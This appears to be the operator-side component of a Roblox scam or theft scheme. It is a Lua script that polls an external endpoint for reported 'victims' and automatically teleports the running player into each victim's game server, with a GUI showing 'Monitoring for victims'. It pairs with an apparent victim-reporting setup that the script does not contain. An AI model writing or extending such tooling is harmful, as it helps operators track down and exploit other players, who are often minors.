
-- Auto-Join Script for Allabove26
-- This script monitors for victim reports and automatically joins their servers

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local WEBHOOK_URL = "https://your-project.replit.app/get-victim-servers" -- New endpoint needed
local CHECK_INTERVAL = 10 -- Check every 10 seconds

-- Function to check for waiting victims
local function checkForVictims()
    pcall(function()
        local response = HttpService:GetAsync(WEBHOOK_URL)
        local data = HttpService:JSONDecode(response)
        
        if data and data.victims and #data.victims > 0 then
            local victim = data.victims[1] -- Get first waiting victim
            
            print("🎯 Found victim waiting:", victim.victimUsername)
            print("📍 Joining server:", victim.placeId, victim.jobId)
            
            -- Join victim's server
            TeleportService:TeleportToPlaceInstance(
                victim.placeId, 
                victim.jobId, 
                LocalPlayer
            )
        end
    end)
end

-- Main monitoring loop
local function startMonitoring()
    print("🔍 Allabove26 Auto-Join System Started")
    print("🎯 Monitoring for victims...")
    
    while true do
        checkForVictims()
        wait(CHECK_INTERVAL)
    end
end

-- Start the monitoring system
spawn(startMonitoring)

-- GUI for manual control
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AutoJoinGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 250, 0, 150)
    frame.Position = UDim2.new(0, 50, 0, 50)
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🎯 Allabove26 Auto-Join"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Parent = frame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 40)
    statusLabel.Position = UDim2.new(0, 0, 0, 40)
    statusLabel.Text = "Status: Monitoring for victims..."
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    statusLabel.TextScaled = true
    statusLabel.BackgroundTransparency = 1
    statusLabel.Parent = frame
    
    local joinButton = Instance.new("TextButton")
    joinButton.Size = UDim2.new(0.8, 0, 0, 30)
    joinButton.Position = UDim2.new(0.1, 0, 0, 90)
    joinButton.Text = "🔍 Check Now"
    joinButton.TextColor3 = Color3.new(1, 1, 1)
    joinButton.BackgroundColor3 = Color3.new(0, 0.5, 1)
    joinButton.Parent = frame
    
    joinButton.MouseButton1Click:Connect(function()
        statusLabel.Text = "Checking for victims..."
        checkForVictims()
        wait(2)
        statusLabel.Text = "Status: Monitoring for victims..."
    end)
end

createGUI()
